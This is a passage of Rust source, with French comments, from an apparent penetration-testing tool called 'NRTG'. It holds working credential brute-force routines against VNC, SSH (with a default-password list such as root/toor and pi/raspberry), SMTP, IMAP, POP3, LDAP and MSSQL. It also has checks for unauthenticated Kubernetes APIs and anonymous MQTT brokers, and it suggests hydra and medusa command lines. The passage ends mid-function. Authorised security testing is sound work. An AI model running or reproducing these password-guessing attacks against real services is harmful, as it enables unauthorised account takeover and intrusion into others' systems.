    // Seuls les protocoles ≥ 3.7 exposent une liste de types de sécurité
    // (les versions 3.3 annoncent directement un unique type sur 4 octets).
    let ver: f32 = banner
        .trim_start_matches("RFB ")
        .trim()
        .parse()
        .unwrap_or(0.0);
    if ver < 3.7 {
        return AttemptOutcome::Error;
    }

    // 2. Notre version : 3.8 (compatible avec les serveurs 3.7).
    if write_all_to(&mut s, b"RFB 003.008\n", timeout)
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }

    // 3. Liste des types de sécurité proposés.
    let Ok(head) = read_n(&mut s, 1, timeout).await else {
        return AttemptOutcome::Error;
    };
    if head[0] == 0 {
        // Échec du handshake : le serveur envoie une raison (len u32 + texte).
        let _ = read_n(&mut s, 4, timeout).await;
        return AttemptOutcome::Error;
    }
    let count = head[0] as usize;
    let Ok(types) = read_n(&mut s, count, timeout).await else {
        return AttemptOutcome::Error;
    };
    if !types.contains(&2u8) {
        return AttemptOutcome::Failure;
    }

    // 4. Sélection du type 2 puis lecture du challenge (16 octets).
    if write_all_to(&mut s, &[2u8], timeout).await.is_err() {
        return AttemptOutcome::Error;
    }
    let Ok(challenge_raw) = read_n(&mut s, 16, timeout).await else {
        return AttemptOutcome::Error;
    };
    let mut challenge = [0u8; 16];
    challenge.copy_from_slice(&challenge_raw);

    // 5. Réponse = DES-ECB(challenge) avec la clé dérivée du mot de passe.
    let response = vnc_des_response(password, &challenge);
    if write_all_to(&mut s, &response, timeout).await.is_err() {
        return AttemptOutcome::Error;
    }

    // 6. SecurityResult (u32 BE) : 0 = succès, 1 = échec.
    let Ok(res) = read_n(&mut s, 4, timeout).await else {
        return AttemptOutcome::Error;
    };
    match u32::from_be_bytes([res[0], res[1], res[2], res[3]]) {
        0 => AttemptOutcome::Success(format!(
            "VNC {}:{} — mot de passe « {} » accepté (DES challenge/réponse, type 2)",
            host, port, password
        )),
        1 => AttemptOutcome::Failure,
        // En RFB 3.8, un refus trop répété est signalé par d'autres codes.
        _ => AttemptOutcome::Failure,
    }
}

/// Bruteforce VNC : d'abord l'absence d'authentification (type 1), puis le
/// vrai challenge/réponse DES du type 2 (RFC 6143 §7.2.2).
pub async fn brute_vnc(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let target = format!("{}:{}", host, port);
    let mut successes: Vec<BruteResult> = Vec::new();
    let mut total_tried = 1usize;

    // 1. Serveur ouvert sans mot de passe ?
    if let Some(r) = check_vnc_auth(host, port, cfg.timeout).await {
        successes.push(r);
        if cfg.stop_on_success {
            return BruteReport {
                target,
                service: "vnc".into(),
                total_tried,
                successes,
                duration_ms: start.elapsed().as_millis(),
            };
        }
    }

    // 2. Test réel des mots de passe (pas de couple utilisateur/mot de passe).
    let pairs: Vec<(String, String)> = cfg
        .passwords
        .iter()
        .take(cfg.max_attempts)
        .map(|p| (VNC_NO_USER.to_string(), p.clone()))
        .collect();

    let (tried, found) =
        run_credential_attempts(pairs, cfg, "vnc", &target, |_user, pass| async move {
            try_vnc_login(host, port, &pass, cfg.timeout).await
        })
        .await;
    total_tried += tried;

    successes.extend(found.into_iter().map(|(_, p, proof)| {
        brute_result(
            "vnc",
            host,
            port,
            VNC_NO_USER.to_string(),
            p,
            proof,
            start.elapsed().as_millis(),
        )
    }));

    BruteReport {
        target,
        service: "vnc".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 11. Kubernetes API unauth check
// ─────────────────────────────────────────────────────────────────────────────

/// Vérifie si l'API Kubernetes répond sans authentification
pub async fn check_kubernetes_unauth(
    host: &str,
    port: u16,
    timeout: Duration,
) -> Option<BruteResult> {
    let start = std::time::Instant::now();
    let scheme = if port == 6443 { "https" } else { "http" };
    let client = reqwest::Client::builder()
        .timeout(timeout)
        .danger_accept_invalid_certs(true)
        .user_agent("NRTG/2.0")
        .build()
        .unwrap_or_default();

    // Try the most revealing endpoints
    for path in &["/api/v1/namespaces", "/api/v1/pods", "/version", "/api"] {
        let url = format!("{}://{}:{}{}", scheme, host, port, path);
        if let Ok(resp) = client.get(&url).send().await {
            let status = resp.status().as_u16();
            if status == 200 {
                let body = resp.text().await.unwrap_or_default();
                // If we got namespaces or pods without auth — critical
                if body.contains("namespaces")
                    || body.contains("items")
                    || body.contains("gitVersion")
                {
                    return Some(BruteResult {
                        service: "kubernetes".into(),
                        host: host.into(),
                        port,
                        username: "(anonymous)".into(),
                        password: "(no auth)".into(),
                        success: true,
                        proof: Some(format!(
                            "Kubernetes API {} — HTTP 200 without credentials | {}",
                            path,
                            body.chars().take(150).collect::<String>()
                        )),
                        duration_ms: start.elapsed().as_millis(),
                    });
                }
            }
        }
    }
    None
}

// ─────────────────────────────────────────────────────────────────────────────
// 12. MQTT anonymous connection check
// ─────────────────────────────────────────────────────────────────────────────

/// Vérifie si le broker MQTT accepte des connexions anonymes (rc=0x00)
pub async fn check_mqtt_anonymous(host: &str, port: u16, timeout: Duration) -> Option<BruteResult> {
    let start = std::time::Instant::now();
    let addr = format!("{}:{}", host, port);

    let Ok(Ok(mut stream)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return None;
    };

    // MQTT CONNECT packet (protocol: MQTT 3.1.1, clean session, no user/pass)
    let connect: &[u8] = &[
        0x10, 0x11, // CONNECT, remaining length=17
        0x00, 0x04, // protocol name length
        0x4d, 0x51, 0x54, 0x54, // "MQTT"
        0x04, // protocol level 4 (3.1.1)
        0x02, // connect flags: clean session only
        0x00, 0x3c, // keepalive=60s
        0x00, 0x07, // client id length
        0x4e, 0x52, 0x54, 0x47, 0x2f, 0x32, 0x30, // "NRTG/20"
    ];

    if tokio::time::timeout(timeout, stream.write_all(connect))
        .await
        .is_err()
    {
        return None;
    }

    let mut buf = [0u8; 16];
    let Ok(Ok(n)) = tokio::time::timeout(timeout, stream.read(&mut buf)).await else {
        return None;
    };

    // CONNACK: 0x20 0x02 <session_present> <return_code=0x00>
    if n >= 4 && buf[0] == 0x20 && buf[1] == 0x02 && buf[3] == 0x00 {
        // Disconnect cleanly
        let _ =
            tokio::time::timeout(Duration::from_millis(300), stream.write_all(&[0xe0, 0x00])).await;
        return Some(BruteResult {
            service: "mqtt".into(),
            host: host.into(),
            port,
            username: "(anonymous)".into(),
            password: "(no auth)".into(),
            success: true,
            proof: Some(format!(
                "MQTT broker accepts anonymous connections (CONNACK rc=0x00) \
                 — port {} — subscribe/publish to all topics possible",
                port
            )),
            duration_ms: start.elapsed().as_millis(),
        });
    }

    None
}

// ─────────────────────────────────────────────────────────────────────────────
// 13. SSH Bruteforce via wire protocol
// ─────────────────────────────────────────────────────────────────────────────

/// Bruteforce SSH par tentatives de connexion TCP + lecture bannière SSH
/// Note: l'auth réelle nécessiterait la crate `ssh2` — ici on détecte les
/// services SSH et teste les accès via subprocess `sshpass` si disponible.
pub async fn brute_ssh(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();

    // 1. Vérifier que le port SSH est ouvert et lire la bannière
    let addr = format!("{}:{}", host, port);
    let banner = {
        let mut buf = vec![0u8; 256];
        match tokio::time::timeout(cfg.timeout, TcpStream::connect(&addr)).await {
            Ok(Ok(mut s)) => {
                let n = tokio::time::timeout(Duration::from_secs(2), s.read(&mut buf))
                    .await
                    .ok()
                    .and_then(|r| r.ok())
                    .unwrap_or(0);
                String::from_utf8_lossy(&buf[..n]).to_string()
            }
            _ => {
                return BruteReport {
                    target: addr,
                    service: "ssh".into(),
                    total_tried: 0,
                    successes: vec![],
                    duration_ms: start.elapsed().as_millis(),
                }
            }
        }
    };

    println!(
        "  \x1b[36m[SSH]\x1b[0m {}  banner: {}",
        addr,
        banner.trim().chars().take(60).collect::<String>()
    );

    // 2. `sshpass` est indispensable : il porte l'authentification SSH.
    //    Installation opt-in (fail-closed sinon) via le module générique.
    let _sshpass_ready =
        crate::installer::ensure_tool("sshpass", cfg.auto_install, cfg.assume_yes).await;

    // Revérifier après tentative d'installation
    if !which_in_path("sshpass") {
        eprintln!(
            "  \x1b[33m[SSH]\x1b[0m {} ouvert — bannière: {} — `sshpass` absent du PATH : \
             bruteforce SSH indisponible ; utiliser `hydra -L users.txt -P pass.txt ssh://{}:{}` \
             ou `medusa -h {} -P pass.txt -u root -M ssh -n {}`",
            addr,
            banner.trim().chars().take(80).collect::<String>(),
            host,
            port,
            host,
            port
        );
        return BruteReport {
            target: format!("{}:{}", host, port),
            service: "ssh".into(),
            total_tried: 0,
            successes: vec![],
            duration_ms: start.elapsed().as_millis(),
        };
    }

    // 3. Credentials par défaut connues, puis wordlist (plafonnée à 100 paires).
    let default_credentials: &[(&str, &str)] = &[
        ("root", ""),
        ("root", "root"),
        ("root", "toor"),
        ("admin", "admin"),
        ("admin", "password"),
        ("pi", "raspberry"),
        ("ubuntu", "ubuntu"),
        ("vagrant", "vagrant"),
        ("ec2-user", ""),
        ("git", ""),
    ];

    let mut pairs: Vec<(String, String)> = default_credentials
        .iter()
        .map(|(u, p)| (u.to_string(), p.to_string()))
        .collect();
    pairs.extend(cfg.credential_pairs().into_iter().take(100));

    let target = format!("{}:{}", host, port);
    let (total_tried, found) =
        run_credential_attempts(pairs, cfg, "ssh", &target, |user, pass| async move {
            match try_ssh_via_sshpass(host, port, &user, &pass, cfg.timeout).await {
                Some(proof) => AttemptOutcome::Success(proof),
                None => AttemptOutcome::Failure,
            }
        })
        .await;

    let successes = found
        .into_iter()
        .map(|(u, p, proof)| {
            brute_result("ssh", host, port, u, p, proof, start.elapsed().as_millis())
        })
        .collect();

    BruteReport {
        target,
        service: "ssh".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

/// Tente un login SSH via sshpass (subprocess) — n'a pas besoin de la crate ssh2
async fn try_ssh_via_sshpass(
    host: &str,
    port: u16,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> Option<String> {
    let timeout_secs = timeout.as_secs().max(3).to_string();
    let port_str = port.to_string();
    let user_owned = user.to_string();
    let host_owned = host.to_string();
    let pass_owned = pass.to_string();

    // Aucun `sh -c` : chaque valeur est transmise comme argument distinct, donc
    // un mot de passe, un utilisateur ou un hôte contenant des métacaractères
    // shell ne peut plus injecter de commande. L'ancienne version interpolait
    // `pass` entre apostrophes non échappées et `user`/`host` hors guillemets
    // dans une ligne exécutée par `sh -c`.
    let output = tokio::task::spawn_blocking(move || {
        let mut cmd = if pass_owned.is_empty() {
            let mut c = std::process::Command::new("ssh");
            c.arg("-o").arg("BatchMode=yes");
            c
        } else {
            let mut c = std::process::Command::new("sshpass");
            c.arg("-p").arg(&pass_owned).arg("ssh");
            c
        };
        cmd.arg("-o")
            .arg(format!("ConnectTimeout={}", timeout_secs))
            .arg("-o")
            .arg("StrictHostKeyChecking=no")
            .arg("-p")
            .arg(&port_str)
            .arg(format!("{}@{}", user_owned, host_owned))
            .arg("id");
        cmd.output().ok()
    })
    .await
    .ok()
    .flatten()?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    let combined = format!("{}{}", stdout, stderr);

    // Succès si "uid=" dans la sortie (résultat de `id`)
    if combined.contains("uid=") {
        Some(format!(
            "SSH login OK: {}@{}:{} | {}",
            user,
            host,
            port,
            combined.trim()
        ))
    } else if combined.contains("Permission denied") || combined.contains("Authentication failed") {
        None
    } else if combined.is_empty() || combined.contains("Connection refused") {
        None
    } else {
        // Connexion établie sans mot de passe (clé SSH, host-based auth)
        Some(format!(
            "SSH possible: {}@{}:{} | {}",
            user,
            host,
            port,
            combined.trim().chars().take(100).collect::<String>()
        ))
    }
}

fn which_in_path(prog: &str) -> bool {
    std::env::var("PATH")
        .ok()
        .map(|p| {
            std::env::split_paths(&p)
                .any(|dir| dir.join(prog).exists() || dir.join(format!("{}.exe", prog)).exists())
        })
        .unwrap_or(false)
}

// ─────────────────────────────────────────────────────────────────────────────
// 14. Messagerie — SMTP (AUTH PLAIN), IMAP (LOGIN), POP3 (USER/PASS)
// ─────────────────────────────────────────────────────────────────────────────
//
// Ces trois protocoles partagent la même approche : lire la bannière, négocier
// en clair, envoyer les credentials et interpréter le code de retour textuel.
// LIMITE : implémentations **en clair** uniquement (SMTP/25 et 587, IMAP/143,
// POP3/110). Les variantes implicites TLS (465/993/995) ne sont pas gérées ici.

/// Lit depuis `stream` jusqu'à ce que `done` valide l'accumulation, avec un
/// plafond d'octets pour ne jamais consommer une réponse sans fin.
async fn read_until<F>(stream: &mut TcpStream, timeout: Duration, mut done: F) -> Option<String>
where
    F: FnMut(&str) -> bool,
{
    let mut acc: Vec<u8> = Vec::new();
    let mut buf = [0u8; 2048];
    loop {
        if acc.len() >= 64 * 1024 {
            break;
        }
        match tokio::time::timeout(timeout, stream.read(&mut buf)).await {
            Ok(Ok(0)) | Err(_) | Ok(Err(_)) => break,
            Ok(Ok(n)) => acc.extend_from_slice(&buf[..n]),
        }
        let text = String::from_utf8_lossy(&acc).to_string();
        if done(&text) {
            return Some(text);
        }
    }
    if acc.is_empty() {
        None
    } else {
        Some(String::from_utf8_lossy(&acc).to_string())
    }
}

/// Lecture stricte de `n` octets (boucle sur `read`), bornée par `timeout`.
/// Générique : sert aussi bien un `TcpStream` nu qu'un flux TLS upgradé (MySQL).
async fn read_n<S>(stream: &mut S, n: usize, timeout: Duration) -> Result<Vec<u8>, ()>
where
    S: tokio::io::AsyncRead + Unpin,
{
    let mut out = Vec::with_capacity(n);
    let mut buf = [0u8; 4096];
    while out.len() < n {
        let want = (n - out.len()).min(buf.len());
        match tokio::time::timeout(timeout, stream.read(&mut buf[..want])).await {
            Ok(Ok(0)) | Err(_) | Ok(Err(_)) => return Err(()),
            Ok(Ok(k)) => out.extend_from_slice(&buf[..k]),
        }
    }
    Ok(out)
}

async fn write_all_to<S>(stream: &mut S, data: &[u8], timeout: Duration) -> Result<(), ()>
where
    S: tokio::io::AsyncWrite + Unpin,
{
    tokio::time::timeout(timeout, stream.write_all(data))
        .await
        .map_err(|_| ())?
        .map_err(|_| ())
}

/// Une réponse SMTP/IMAP est complète dès qu'une ligne « ddd<espace> » apparaît.
fn code_line_complete(text: &str) -> bool {
    text.lines().any(|l| {
        let b = l.as_bytes();
        b.len() >= 4
            && b[0].is_ascii_digit()
            && b[1].is_ascii_digit()
            && b[2].is_ascii_digit()
            && b[3] == b' '
    })
}

fn line_complete(text: &str) -> bool {
    text.contains('\n')
}

/// Code de retour à 3 chiffres d'une réponse textuelle.
fn resp_code(text: &str) -> &str {
    text.lines().next().unwrap_or("").get(0..3).unwrap_or("")
}

pub async fn brute_smtp(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let target = format!("{}:{}", host, port);

    let (total_tried, found) = run_credential_attempts(
        cfg.credential_pairs(),
        cfg,
        "smtp",
        &target,
        |user, pass| async move { try_smtp_login(host, port, &user, &pass, cfg.timeout).await },
    )
    .await;

    let successes = found
        .into_iter()
        .map(|(u, p, proof)| {
            brute_result("smtp", host, port, u, p, proof, start.elapsed().as_millis())
        })
        .collect();

    BruteReport {
        target,
        service: "smtp".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

async fn try_smtp_login(
    host: &str,
    port: u16,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> AttemptOutcome {
    use base64::Engine;

    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut stream)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return AttemptOutcome::Error;
    };

    let Some(banner) = read_until(&mut stream, timeout, code_line_complete).await else {
        return AttemptOutcome::Error;
    };
    if resp_code(&banner) != "220" {
        return AttemptOutcome::Failure;
    }

    // EHLO — la capacité AUTH doit être annoncée par le serveur.
    if write_all_to(&mut stream, b"EHLO nrtg.invalid\r\n", timeout)
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }
    let Some(ehlo) = read_until(&mut stream, timeout, code_line_complete).await else {
        return AttemptOutcome::Error;
    };
    if !ehlo.to_ascii_uppercase().contains("AUTH") {
        let _ = write_all_to(&mut stream, b"QUIT\r\n", timeout).await;
        return AttemptOutcome::Failure;
    }

    // AUTH PLAIN : base64( "\0" user "\0" pass )
    let token = base64::engine::general_purpose::STANDARD.encode(format!("\0{}\0{}", user, pass));
    let cmd = format!("AUTH PLAIN {}\r\n", token);
    if write_all_to(&mut stream, cmd.as_bytes(), timeout)
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }
    let Some(resp) = read_until(&mut stream, timeout, code_line_complete).await else {
        return AttemptOutcome::Error;
    };
    let _ = write_all_to(&mut stream, b"QUIT\r\n", timeout).await;

    match resp_code(&resp) {
        "235" => AttemptOutcome::Success(format!(
            "SMTP AUTH PLAIN accepté (235) : {}:{} — {}",
            user,
            pass,
            resp.lines().next().unwrap_or("")
        )),
        _ => match detect_lockout(&resp) {
            Some(m) => AttemptOutcome::Locked(format!("SMTP {} — {}", resp.trim(), m)),
            None => AttemptOutcome::Failure,
        },
    }
}

pub async fn brute_imap(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let target = format!("{}:{}", host, port);

    let (total_tried, found) = run_credential_attempts(
        cfg.credential_pairs(),
        cfg,
        "imap",
        &target,
        |user, pass| async move { try_imap_login(host, port, &user, &pass, cfg.timeout).await },
    )
    .await;

    let successes = found
        .into_iter()
        .map(|(u, p, proof)| {
            brute_result("imap", host, port, u, p, proof, start.elapsed().as_millis())
        })
        .collect();

    BruteReport {
        target,
        service: "imap".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

async fn try_imap_login(
    host: &str,
    port: u16,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> AttemptOutcome {
    // Échappement des chaînes IMAP quotées (RFC 3501).
    fn quoted(s: &str) -> String {
        let mut out = String::with_capacity(s.len() + 2);
        out.push('"');
        for c in s.chars() {
            if c == '"' || c == '\\' {
                out.push('\\');
            }
            out.push(c);
        }
        out.push('"');
        out
    }

    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut stream)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return AttemptOutcome::Error;
    };

    let Some(banner) = read_until(&mut stream, timeout, line_complete).await else {
        return AttemptOutcome::Error;
    };
    if !banner.to_ascii_uppercase().contains("OK") {
        return AttemptOutcome::Failure;
    }

    let cmd = format!("a001 LOGIN {} {}\r\n", quoted(user), quoted(pass));
    if write_all_to(&mut stream, cmd.as_bytes(), timeout)
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }
    let Some(resp) = read_until(&mut stream, timeout, |t| {
        t.lines()
            .any(|l| l.trim_start().to_ascii_lowercase().starts_with("a001 "))
    })
    .await
    else {
        return AttemptOutcome::Error;
    };

    let _ = write_all_to(&mut stream, b"a002 LOGOUT\r\n", timeout).await;

    let tagged = resp
        .lines()
        .find(|l| l.trim_start().to_ascii_lowercase().starts_with("a001 "))
        .unwrap_or("")
        .trim()
        .to_ascii_uppercase();

    if tagged.contains("A001 OK") {
        AttemptOutcome::Success(format!("IMAP LOGIN accepté (a001 OK) : {}:{}", user, pass))
    } else if tagged.contains("A001 NO") || tagged.contains("A001 BAD") {
        match detect_lockout(&resp) {
            Some(m) => AttemptOutcome::Locked(format!("IMAP {} — {}", tagged, m)),
            None => AttemptOutcome::Failure,
        }
    } else {
        AttemptOutcome::Failure
    }
}

pub async fn brute_pop3(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let target = format!("{}:{}", host, port);

    let (total_tried, found) = run_credential_attempts(
        cfg.credential_pairs(),
        cfg,
        "pop3",
        &target,
        |user, pass| async move { try_pop3_login(host, port, &user, &pass, cfg.timeout).await },
    )
    .await;

    let successes = found
        .into_iter()
        .map(|(u, p, proof)| {
            brute_result("pop3", host, port, u, p, proof, start.elapsed().as_millis())
        })
        .collect();

    BruteReport {
        target,
        service: "pop3".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

async fn try_pop3_login(
    host: &str,
    port: u16,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> AttemptOutcome {
    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut stream)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return AttemptOutcome::Error;
    };

    let Some(banner) = read_until(&mut stream, timeout, line_complete).await else {
        return AttemptOutcome::Error;
    };
    if !banner.starts_with("+OK") {
        return AttemptOutcome::Failure;
    }

    // USER
    let cmd = format!("USER {}\r\n", user);
    if write_all_to(&mut stream, cmd.as_bytes(), timeout)
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }
    let Some(user_resp) = read_until(&mut stream, timeout, line_complete).await else {
        return AttemptOutcome::Error;
    };
    if !user_resp.starts_with("+OK") {
        return match detect_lockout(&user_resp) {
            Some(m) => AttemptOutcome::Locked(format!("POP3 {} — {}", user_resp.trim(), m)),
            None => AttemptOutcome::Failure,
        };
    }

    // PASS
    let cmd = format!("PASS {}\r\n", pass);
    if write_all_to(&mut stream, cmd.as_bytes(), timeout)
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }
    let Some(pass_resp) = read_until(&mut stream, timeout, line_complete).await else {
        return AttemptOutcome::Error;
    };
    let _ = write_all_to(&mut stream, b"QUIT\r\n", timeout).await;

    if pass_resp.starts_with("+OK") {
        AttemptOutcome::Success(format!(
            "POP3 USER/PASS accepté : {}:{} — {}",
            user,
            pass,
            pass_resp.lines().next().unwrap_or("")
        ))
    } else if let Some(m) = detect_lockout(&pass_resp) {
        AttemptOutcome::Locked(format!("POP3 {} — {}", pass_resp.trim(), m))
    } else {
        AttemptOutcome::Failure
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 15. LDAP — simple bind (BER)
// ─────────────────────────────────────────────────────────────────────────────
//
// LIMITE : le DN est utilisé tel quel (le mot de passe est testé contre le nom
// fourni). Pour Active Directory, fournir un UPN `user@domaine` ou un DN complet
// dans la wordlist d'utilisateurs. Le canal est en clair (LDAP/389).

pub async fn brute_ldap(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let target = format!("{}:{}", host, port);

    let (total_tried, found) = run_credential_attempts(
        cfg.credential_pairs(),
        cfg,
        "ldap",
        &target,
        |user, pass| async move { try_ldap_bind(host, port, &user, &pass, cfg.timeout).await },
    )
    .await;

    let successes = found
        .into_iter()
        .map(|(u, p, proof)| {
            brute_result("ldap", host, port, u, p, proof, start.elapsed().as_millis())
        })
        .collect();

    BruteReport {
        target,
        service: "ldap".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

/// Longueur BER (défini ou indéfini court) — renvoie la valeur et avance `i`.
fn ber_len(buf: &[u8], i: &mut usize) -> Option<usize> {
    let b = *buf.get(*i)?;
    *i += 1;
    if b & 0x80 == 0 {
        return Some(b as usize);
    }
    let n = (b & 0x7F) as usize;
    if n == 0 || n > 4 {
        return None;
    }
    let mut v = 0usize;
    for _ in 0..n {
        v = (v << 8) | (*buf.get(*i)? as usize);
        *i += 1;
    }
    Some(v)
}

/// Encode une longueur BER.
fn ber_encode_len(len: usize, out: &mut Vec<u8>) {
    if len < 0x80 {
        out.push(len as u8);
    } else if len <= 0xFF {
        out.push(0x81);
        out.push(len as u8);
    } else {
        out.push(0x82);
        out.push((len >> 8) as u8);
        out.push((len & 0xFF) as u8);
    }
}

/// Construit un BindRequest LDAP v3 en bind simple.
fn ldap_bind_request(user: &str, pass: &str) -> Vec<u8> {
    let mut bind = Vec::new();
    bind.push(0x02);
    bind.push(0x01);
    bind.push(0x03); // version 3
                     // name
    bind.push(0x04);
    ber_encode_len(user.len(), &mut bind);
    bind.extend_from_slice(user.as_bytes());
    // simple authentication [0] (primitive)
    bind.push(0x80);
    ber_encode_len(pass.len(), &mut bind);
    bind.extend_from_slice(pass.as_bytes());

    let mut bind_seq = Vec::new();
    bind_seq.push(0x60); // [APPLICATION 0] BindRequest
    ber_encode_len(bind.len(), &mut bind_seq);
    bind_seq.extend_from_slice(&bind);

    let mut msg = Vec::new();
    msg.push(0x02);
    msg.push(0x01);
    msg.push(0x01); // messageID = 1
    msg.extend_from_slice(&bind_seq);

    let mut out = Vec::new();
    out.push(0x30); // SEQUENCE
    ber_encode_len(msg.len(), &mut out);
    out.extend_from_slice(&msg);
    out
}

/// Extrait le `resultCode` d'une BindResponse LDAP. 0 = succès.
fn ldap_bind_result(buf: &[u8]) -> Option<u8> {
    let mut i = 0;
    if *buf.get(i)? != 0x30 {
        return None;
    }
    i += 1;
    ber_len(buf, &mut i)?;
    if *buf.get(i)? != 0x02 {
        return None;
    } // messageID
    i += 1;
    let idlen = ber_len(buf, &mut i)?;
    i += idlen;
    if *buf.get(i)? != 0x61 {
        return None;
    } // [APPLICATION 1] BindResponse
    i += 1;
    ber_len(buf, &mut i)?;
    if *buf.get(i)? != 0x0A {
        return None;
    } // resultCode ENUMERATED
    i += 1;
    let clen = ber_len(buf, &mut i)?;
    let mut v = 0u32;
    for _ in 0..clen {
        v = (v << 8) | (*buf.get(i)? as u32);
        i += 1;
    }
    Some(v as u8)
}

async fn ldap_read_message(stream: &mut TcpStream, timeout: Duration) -> Result<Vec<u8>, ()> {
    let tag = read_n(stream, 1, timeout).await?;
    if tag[0] != 0x30 {
        return Err(());
    }
    let l0 = read_n(stream, 1, timeout).await?;
    let mut head = vec![0x30u8, l0[0]];
    let total = if l0[0] & 0x80 == 0 {
        l0[0] as usize
    } else {
        let n = (l0[0] & 0x7F) as usize;
        if n == 0 || n > 4 {
            return Err(());
        }
        let lb = read_n(stream, n, timeout).await?;
        head.extend_from_slice(&lb);
        let mut v = 0usize;
        for b in &lb {
            v = (v << 8) | (*b as usize);
        }
        v
    };
    if total > 65_535 {
        return Err(());
    }
    let body = read_n(stream, total, timeout).await?;
    head.extend_from_slice(&body);
    Ok(head)
}

async fn try_ldap_bind(
    host: &str,
    port: u16,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> AttemptOutcome {
    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut stream)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return AttemptOutcome::Error;
    };

    let req = ldap_bind_request(user, pass);
    if write_all_to(&mut stream, &req, timeout).await.is_err() {
        return AttemptOutcome::Error;
    }
    let Ok(resp) = ldap_read_message(&mut stream, timeout).await else {
        return AttemptOutcome::Error;
    };

    match ldap_bind_result(&resp) {
        Some(0) => AttemptOutcome::Success(format!(
            "LDAP simple bind accepté (resultCode 0) : {}:{}",
            user, pass
        )),
        // 49 = invalidCredentials ; 53 = unwillingToPerform (compte verrouillé
        // ou politique) ; 1 = operationsError. Les autres codes ne prouvent rien.
        Some(53) => AttemptOutcome::Locked(format!(
            "LDAP resultCode 53 (unwillingToPerform) pour « {} »",
            user
        )),
        Some(_) => AttemptOutcome::Failure,
        None => AttemptOutcome::Failure,
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 16. MSSQL — TDS PRELOGIN + LOGIN7 (TDS 7.4)
// ─────────────────────────────────────────────────────────────────────────────
//
// Séquence standard : PRELOGIN (négociation, dont le chiffrement) puis LOGIN7
// portant l'utilisateur et le mot de passe obfusqué (échange de nibbles + XOR
// 0xA5, encodé UTF-16LE). Succès = token LOGINACK (0xAD) ; échec = token ERROR
// (0xAA) — vérifié en priorité pour éviter tout faux positif.

const TDS_FIXED: u16 = 94;

fn tds_packet(kind: u8, payload: &[u8]) -> Vec<u8> {
    let total = (8 + payload.len()) as u16;
    let mut p = Vec::with_capacity(total as usize);
    p.push(kind);
    p.push(0x01); // status EOM
    p.extend_from_slice(&total.to_be_bytes());
    p.extend_from_slice(&[0x00, 0x00]); // SPID
    p.push(0x01); // PacketID
    p.push(0x00); // Window
    p.extend_from_slice(payload);
    p
}

/// Chiffre un mot de passe TDS : nibbles échangés puis XOR 0xA5, UTF-16LE.
fn tds_obfuscate(pass: &str) -> Vec<u8> {
    let mut out = Vec::new();
    for u in pass.encode_utf16() {
        for b in u.to_le_bytes() {
            let sw = ((b << 4) & 0xF0) | ((b >> 4) & 0x0F);
            out.push(sw ^ 0xA5);
        }
    }
    out
}

fn tds_add_field(data: &mut Vec<u8>, s: &str) -> (u16, u16) {
    let start = TDS_FIXED + data.len() as u16;
    let mut count = 0u16;
    for u in s.encode_utf16() {
        data.extend_from_slice(&u.to_le_bytes());
        count += 1;
    }
    (start, count)
}

fn tds_login7(user: &str, pass: &str) -> Vec<u8> {
    let mut data: Vec<u8> = Vec::new();
    let (host_off, host_len) = tds_add_field(&mut data, "NRTG");
    let (user_off, user_len) = tds_add_field(&mut data, user);
    let pwd = tds_obfuscate(pass);
    let pwd_off = TDS_FIXED + data.len() as u16;
    let pwd_len = (pwd.len() / 2) as u16;
    data.extend_from_slice(&pwd);
    let (app_off, app_len) = tds_add_field(&mut data, "NRTG");

    let mut p: Vec<u8> = Vec::with_capacity(TDS_FIXED as usize + data.len());
    p.extend_from_slice(&0u32.to_le_bytes()); // Length (corrigé plus bas)
    p.extend_from_slice(&0x7400_0004u32.to_le_bytes()); // TDS 7.4
    p.extend_from_slice(&4096u32.to_le_bytes()); // PacketSize
    p.extend_from_slice(&0u32.to_le_bytes()); // ClientProgVer
    p.extend_from_slice(&0u32.to_le_bytes()); // ClientPID
    p.extend_from_slice(&0u32.to_le_bytes()); // ConnectionID
    p.push(0x00); // OptionFlags1
    p.push(0x00); // OptionFlags2
    p.push(0x00); // TypeFlags
    p.push(0x00); // OptionFlags3
    p.extend_from_slice(&0i32.to_le_bytes()); // ClientTimeZone
    p.extend_from_slice(&0u32.to_le_bytes()); // ClientLCID

